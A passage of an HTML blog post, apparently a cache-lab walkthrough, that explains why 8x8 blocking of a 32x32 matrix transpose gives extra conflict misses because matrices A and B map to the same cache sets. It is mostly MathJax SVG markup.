class="line"> -------------------</span><br><span class="line">| 24 | 25 | 26 | 27 |  row 31</span><br><span class="line"> -------------------</span><br><span class="line">| 28 | 29 | 30 | 31 |  row 32</span><br><span class="line"> -------------------</span><br></pre></td></tr></table></figure>
<p>Each block has 8 integers (32 bytes). You can see that this pattern
repeats every 8 rows. So, it we use 8*8 blocking to partition this
matrix, the number of misses will amount to
<code>32*32/(8*8)*8*2=256</code> times (<code>32*32/(8*8)</code>
blockings for a single matrix, each blocking produces 8 misses and two
matrices).</p>
<p>But when adopt 8*8 blocking, the result will be 344 misses! Why is
that? We can guess it's because matrix <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.717ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 759 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></svg></mjx-container></span> overwrites some of the caches for
matrix <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.697ex" height="1.62ex" role="img" focusable="false" viewBox="0 -716 750 716"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></svg></mjx-container></span>!</p>
<p>To validate our assumption, we can print the addresses of <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.697ex" height="1.62ex" role="img" focusable="false" viewBox="0 -716 750 716"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></svg></mjx-container></span> and <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.717ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 759 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></svg></mjx-container></span>. Add
<code>printf("%p %p\n", A, B);</code> in <code>tracegen.c</code> and see
their addresses:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x59010cdbb0c0 0x59010cdfb0c0</span><br></pre></td></tr></table></figure>
<p>Note that your result may differ from mine. Recall that in the
problem settings <code>s=b=5</code>. The addresses of <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.697ex" height="1.62ex" role="img" focusable="false" viewBox="0 -716 750 716"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></svg></mjx-container></span> and <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.717ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 759 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></svg></mjx-container></span> have the same lowest 16 bits. This
means matrix <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.717ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 759 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></svg></mjx-container></span> has the same cache
layout pattern as matrix <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.697ex" height="1.62ex" role="img" focusable="false" viewBox="0 -716 750 716"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></svg></mjx-container></span>. When we
read the first element of <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.697ex" height="1.62ex" role="img" focusable="false" viewBox="0 -716 750 716"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></svg></mjx-container></span>, the
first block will be loaded; when we read the first element of <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.717ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 759 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></svg></mjx-container></span>, it overwrites the block just loaded
from <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.697ex" height="1.62ex" role="img" focusable="false" viewBox="0 -716 750 716"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></svg></mjx-container></span>!</p>
<p>With that being said, reading <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="6.475ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2862 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(750,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(1028,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(1528,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="mo" transform="translate(1806,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(2084,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(2584,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g></g></g></svg></mjx-container></span> and writing it to <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="6.495ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2871 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mo" transform="translate(759,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(1037,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(1537,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="mo" transform="translate(1815,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(2093,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(2593,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g></g></g></svg></mjx-container></span> causes two cache misses! The
first is a cold miss which we cannot avoid, but the second is a conflict
miss but it's hard to avoid.</p>
<p>Again, reading <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="6.475ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2862 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(750,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(1028,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(1528,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="mo" transform="translate(1806,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(2084,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(2584,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g></g></g></svg></mjx-container></span> and
writing it to <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="6.495ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2871 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mo" transform="translate(759,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(1037,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(1537,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="mo" transform="translate(1815,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(2093,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(2593,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g></g></g></svg></mjx-container></span> also cases
two misses. The first is a conflict miss with the block from <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="6.495ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2871 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mo" transform="translate(759,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(1037,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(1537,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="mo" transform="translate(1815,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(2093,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(2593,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g></g></g></svg></mjx-container></span>. The second is a cold miss.</p>
<p>We do not want the conflict miss that takes place when reading <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="6.475ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2862 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(750,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(1028,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(1528,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="mo" transform="translate(1806,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(2084,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(2584,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g></g></g></svg></mjx-container></span>. This miss happens when the cache
will be overwritten by the block of <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="6.475ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2862 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(750,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(1028,0)"><path data-c="30" 